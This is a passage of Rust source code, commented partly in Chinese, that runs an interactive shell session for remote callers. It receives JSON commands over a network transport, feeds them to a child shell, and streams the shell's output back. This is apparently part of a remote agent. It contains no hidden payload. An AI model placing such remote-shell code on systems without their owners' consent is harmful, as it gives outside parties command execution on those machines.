                            if text.trim().is_empty() {
                                debug!("Ignoring empty/white space message (heartbeat)");
                                continue;
                            }
                            
                            // 尝试解析为 JSON 消息
                            if let Ok(wrapper) = serde_json::from_str::<MessageWrapper>(&text) {
                                if wrapper.msg_type == MessageType::Command {
                                    if let Ok(command_payload) = serde_json::from_value::<CommandPayload>(wrapper.payload.clone()) {
                                        let cmd_type = command_payload.command_type.as_str();
                                        
                                        if cmd_type == "shell" {
                                            let command = command_payload.command_content;
                                            // Allow empty commands (e.g., just pressing Enter) in interactive mode
                                            
                                            // 将有效命令写入 CMD stdin
                                            let command_with_newline = format!("{}\n", command);
                                            let _ = stdin.write_all(command_with_newline.as_bytes()).await;
                                            let _ = stdin.flush().await;
                                        } else if cmd_type == "shell_exit" {
                                            info!("Exiting interactive shell session");
                                            break;
                                        } else {
                                            // 🚀 CRITICAL FIX: 在循环中也允许处理其他非 shell 指令 (如列表等)
                                            if let Err(e) = self.handle_command(wrapper).await {
                                                error!("Error handling non-shell command in PTY loop: {}", e);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        Err(e) => {
                            error!("Transport error in shell session: {}", e);
                            break;
                        }
                    }
                }
                
                // 🚀 NEW: 从 shell stdout 读取输出并使用 encoding_rs 正确解码中文
                stdout_result = async {
                    let mut buf = [0u8; 1024];
                    match stdout.read(&mut buf).await {
                        Ok(n) => Ok((n, buf)),
                        Err(e) => Err(e),
                    }
                } => {
                    match stdout_result {
                        Ok((0, _)) => {
                            warn!("Shell stdout closed");
                            break;
                        }
                        Ok((n, buf)) => {
                            #[cfg(target_os = "windows")]
                            let output = Self::decode_windows_output(&buf[..n]);
                            #[cfg(not(target_os = "windows"))]
                            let output = String::from_utf8_lossy(&buf[..n]).to_string();
                            
                            if !output.trim().is_empty() {
                                // ⚡ FIX: 必须包装成 JSON 响应！
                                let response_result = CommandResult {
                                    stdout: output,
                                    stderr: String::new(),
                                    path: None,
                                    req_id: req_id.clone(),
                                };
                                let response_msg = response_result.to_response_message();
                                let _ = self.send_message(&response_msg).await;
                            }
                        }
                        Err(e) => {
                            error!("Error reading shell stdout: {}", e);
                            break;
                        }
                    }
                }
                
                // 🚀 NEW: 从 shell stderr 读取错误输出并使用 encoding_rs 正确解码中文
                stderr_result = async {
                    let mut buf = [0u8; 1024];
                    match stderr.read(&mut buf).await {
                        Ok(n) => Ok((n, buf)),
                        Err(e) => Err(e),
                    }
                } => {
                    match stderr_result {
                        Ok((0, _)) => {}
                        Ok((n, buf)) => {
                            #[cfg(target_os = "windows")]
                            let output = Self::decode_windows_output(&buf[..n]);
                            #[cfg(not(target_os = "windows"))]
                            let output = String::from_utf8_lossy(&buf[..n]).to_string();
                            
                            if !output.trim().is_empty() {
                                let response_result = CommandResult {
                                    stdout: String::new(),
                                    stderr: output,
                                    path: None,
                                    req_id: req_id.clone(),
                                };
                                let response_msg = response_result.to_response_message();
                                let _ = self.send_message(&response_msg).await;
                            }
                        }
                        Err(e) => {
                            error!("Error reading shell stderr: {}", e);
                            break;
                        }
                    }
                }
                
                // 检查进程是否仍在运行
                process_result = child.wait() => {
                    match process_result {
                        Ok(status) => {
                            info!("Shell process exited with status: {}", status);
                            break;
                        }
                        Err(e) => {
                            error!("Error waiting for shell process: {}", e);
                            break;
                        }
                    }
                }
            }
        }
        
        // 清理进程
        if let Err(e) = child.kill().await {
            warn!("Failed to kill shell process: {}", e);
        }
        
        info!("Interactive shell session ended");
        
        CommandResult {
            stdout: "Interactive shell session ended".to_string(),
            stderr: String::new(),
            path: None,
            req_id: None,
        }
        }.boxed()
    }
}

/// Simple time helper (no chrono dependency) — used in MessageHandler loop
fn chrono_like_now() -> i32 {
    // Returns local hour (UTC+8 approximated), no external crate
    ((std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() % 86400 / 3600)
        .unwrap_or(12) as i32) + 8) % 24
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_message_handler_creation() {
        // 这个测试只是确保结构体可以被创建
        // 实际的功能测试在集成测试中进行
    }
}
